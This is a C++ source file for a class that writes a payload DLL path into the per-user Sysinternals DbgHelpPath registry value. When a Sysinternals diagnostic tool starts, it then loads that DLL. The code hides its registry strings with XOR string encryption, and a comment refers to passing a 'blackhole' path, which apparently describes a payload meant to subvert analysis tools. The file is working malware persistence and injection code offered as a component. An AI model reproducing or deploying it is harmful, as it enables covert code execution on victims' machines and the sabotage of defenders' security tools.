#include "stdafx.h"
#include <Windows.h>
#include <Shlwapi.h>
#include "SysInternalHook.h"
#include "StringEncrypt.h"
#include "Debug.h"

//
// Write dll path to SysInternal DbgHelp Key
bool SysInternalHook::WriteHook(std::wstring toolName)
{
	//Ensure payload/hook exists
	if (!this->PayloadExists())
		return false;

	HKEY KEY_CU;
	XorS(SOFTWARE_SYSINTENRAL, "\\SOFTWARE\\SysInternals\\");
	XorS(DBG_HELP_PATH, "DbgHelpPath");

	//open sysinternal tool's regkey for write access
	std::wstring targetKey = SOFTWARE_SYSINTENRAL.decrypt() + toolName;

	if (RegOpenKeyEx(HKEY_CURRENT_USER, targetKey.c_str(), 0, KEY_SET_VALUE, &KEY_CU) != ERROR_SUCCESS) {
#ifdef DEBUG
		DebugOut(std::wstring(L"Unable to open RegKey - ") + targetKey);
#endif
		return false;
	}
	
	//write payload path to sysinternal dbghelp key
	if (RegSetValue(KEY_CU, DBG_HELP_PATH.decrypt().c_str(), REG_SZ, this->injectPayload.c_str(), NULL) != ERROR_SUCCESS) {
#ifdef DEBUG
		DebugOut(std::wstring(L"Unable to set regKey - ") + targetKey + DBG_HELP_PATH.decrypt());
#endif
		return false;
	}
	return true;
}

bool SysInternalHook::PayloadExists()
{
	if (!PathFileExists(injectPayload.c_str())) {
#ifdef DEBUG
		DebugOut(std::wstring(L"payload path does not exist - ") + injectPayload);
#endif
		return false;
	}
	return true;
}

//pass blackhole path here
SysInternalHook::SysInternalHook(std::wstring path)
{
	this->injectPayload = path;
}


SysInternalHook::~SysInternalHook()
{
}
